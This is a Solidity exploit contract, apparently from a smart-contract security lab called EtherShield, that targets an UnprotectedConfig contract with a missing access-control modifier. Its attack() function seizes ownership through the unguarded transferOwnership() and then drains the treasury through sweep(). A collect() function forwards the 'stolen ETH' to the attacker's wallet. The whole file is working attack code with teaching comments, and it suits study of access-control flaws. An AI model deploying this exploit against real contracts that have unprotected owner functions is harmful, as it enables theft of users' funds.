// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {UnprotectedConfig} from "../vulnerable/UnprotectedConfig.sol";

/// @title AccessControlAttacker
/// @notice Exploit for UnprotectedConfig (SWC-105 / CWE-284). EtherShield lab,
///         local chain only.
/// @dev Unlike the reentrancy exploit, this needs no callback trickery - the
///      whole attack is two ordinary calls. The point it makes: one missing
///      modifier is enough. attack() seizes ownership through the unguarded
///      transferOwnership(), then calls sweep() - which IS guarded - as the now
///      "legitimate" owner. The guard on sweep() never fires because, by the
///      time it runs, this contract genuinely is the owner.
contract AccessControlAttacker {
    UnprotectedConfig public immutable config;
    address public immutable owner;

    event AttackerStarted(address indexed target);
    event Hijacked(address indexed newOwner);
    event Drained(uint256 amount);

    error NotOwner();
    error PayoutFailed();

    constructor(UnprotectedConfig _config) {
        config = _config;
        owner = msg.sender;
    }

    /// @notice Seize ownership, then drain the treasury - one transaction.
    function attack() external {
        emit AttackerStarted(address(config));

        // Step 1: walk through the unlocked door. No value, no caller check.
        emit Hijacked(address(this));
        config.transferOwnership(address(this));

        // Step 2: use the key we just took. sweep() is onlyOwner, and we ARE
        // the owner now, so it pays out willingly.
        config.sweep(address(this));
    }

    /// @notice Accept the swept treasury.
    /// @dev Drained is emitted HERE rather than in attack(). Two reasons: this
    ///      reports what the exploit actually received instead of what it
    ///      predicted from a totalAssets() read, and no external call precedes
    ///      it, so the file carries no `reentrancy-events` finding.
    receive() external payable {
        emit Drained(msg.value);
    }

    /// @notice Forward the stolen ETH to the attacker's EOA.
    function collect() external {
        if (msg.sender != owner) revert NotOwner();
        (bool ok,) = owner.call{value: address(this).balance}("");
        if (!ok) revert PayoutFailed();
    }

    /// @notice ETH currently held by this exploit contract.
    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
